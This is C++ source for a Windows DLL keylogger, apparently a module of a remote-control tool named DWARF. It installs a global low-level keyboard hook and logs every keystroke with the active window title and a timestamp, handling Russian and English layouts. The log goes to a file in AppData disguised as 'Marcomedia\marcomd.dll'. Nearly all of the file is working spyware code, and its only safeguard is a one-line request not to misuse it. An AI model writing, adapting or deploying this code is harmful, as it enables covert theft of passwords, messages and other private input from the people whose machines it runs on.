// DWARF moduled remote manipulation system
// Licensed over https://github.com/hyracan/DWARF
// Please no misuse

#define _CRT_SECURE_NO_WARNINGS

#include "keylogger.h"

char ReplaceResult(string inText)
{
	size_t pos = _eng.find(inText);
	if (pos != std::string::npos)
		return _rus[pos];
	else
		return 0;
}

void writeToLog(string s)
{
	HKL layout = GetKeyboardLayout(0);

	strcpy(logName, getenv("APPDATA"));
	strcat(logName, "\\Marcomedia\\marcomd.dll");

	ofstream log(logName, ios::app);

	// Gettime
	time_t seconds = time(NULL);
	tm* timeinfo = localtime(&seconds);

	HWND hwnd;                                           
	DWORD iProc;
	HKL MyLayout;
	char title[101];
	hwnd = GetForegroundWindow();
	iProc = GetWindowThreadProcessId(hwnd, NULL);
	MyLayout = GetKeyboardLayout(iProc);
	GetWindowTextA(hwnd, title, 100);

	if (LOWORD((DWORD)GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL))) == 0x0419) { 
		log << title;
		log << ": Russian";                                  
		log << ": " << ReplaceResult(s);                       
		log << ": " << asctime(timeinfo) << endl;              

		/*outText.append(title);
		outText.append(": Russian ");
		cortText = ReplaceResult(s);
		outText.append(cortText);
		outText.append(" ");
		outText.append(asctime(timeinfo));
		outText.append("\n");*/
		countSimbols++;
		if (countSimbols == 20) {
			countSimbols = 0;
		}
	}
	else if (LOWORD((DWORD)GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL))) == 0x0409) { 
		log << title;
	    log << ": English";
		log << ": " << s;
		log << ": " << asctime(timeinfo) << endl;
		

		/*outText.append(title);
		outText.append(": English ");
		outText.append(s);
		outText.append(" ");
		outText.append(asctime(timeinfo));
		outText.append("\n");*/
		countSimbols++;
		if (countSimbols == 20) {
			countSimbols = 0;
		}
	}
	//log.close();
}

BOOL isCaps()
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ||
		((GetKeyState(VK_SHIFT) & 0x8000) != 0)) {
		return 1;
	}
	else {
		return 0;
	}
}

LRESULT CALLBACK hookProc(int nCode,
	WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{

		p = (PKBDLLHOOKSTRUCT)(lParam);
		sc = MapVirtualKey(p->vkCode, 0);
		sc <<= 16;

		if (!(p->vkCode <= 32))
		{
			sc |= 0x1 << 24;
		}

		GetKeyNameTextA(sc, keyNameBuff, 16);

		myKey = keyNameBuff;
		if (myKey == "Space") {
			writeToLog("[SPACE]");
		}
		else if (myKey == "Right Alt") {
			writeToLog("[R ALT]");
		}
		else if (myKey == "Enter") {
			writeToLog("[ENTER]");
		}
		else if (myKey == "Left Alt") {
			writeToLog("[L ALT]");
		}
		else if (myKey == "Tab") {
			writeToLog("[TAB]");
		}
		else if (myKey == "Backspace") {
			writeToLog("[Backspace]");
		}
		else if (myKey == "Caps Lock") {
			writeToLog("[CAPS]");
		}
		else if (myKey == "Delete") {
			writeToLog("[DEL]");
		}
		else if (myKey == "Right Shift") {
			writeToLog("[R SHIFT]");
		}
		else if (myKey == "Shift") {
			writeToLog("[L SHIFT]");
		}
		else if (myKey == "Ctrl") {
			writeToLog("[L CTRL]");
		}
		else if (myKey == "Right Ctrl") {
			writeToLog("[R CTRL]");
		}
		else {
			if (isCaps() == 1) {
				writeToLog(myKey);
			}
			else {
				std::transform(myKey.begin(), myKey.end(),
					myKey.begin(), ::tolower);
				writeToLog(myKey);
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void msgLoop()
{
	while (GetMessage(&message, NULL, 0, 0))
	{
			TranslateMessage(&message);
			DispatchMessage(&message);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		printf("Initialize(); is ok! \n");
		break;

	case DLL_PROCESS_DETACH:
		UnSetHook();
		printf("Unloaded(); is ok! \n");
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}

extern "C" __declspec(dllexport) void SetHook()
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		hookProc, hInstance, 0);
	msgLoop();
}

extern "C" __declspec(dllexport) void UnSetHook()
{
	UnhookWindowsHookEx(keyboardHook);
	printf("UnSetHook(); is ok! \n");
}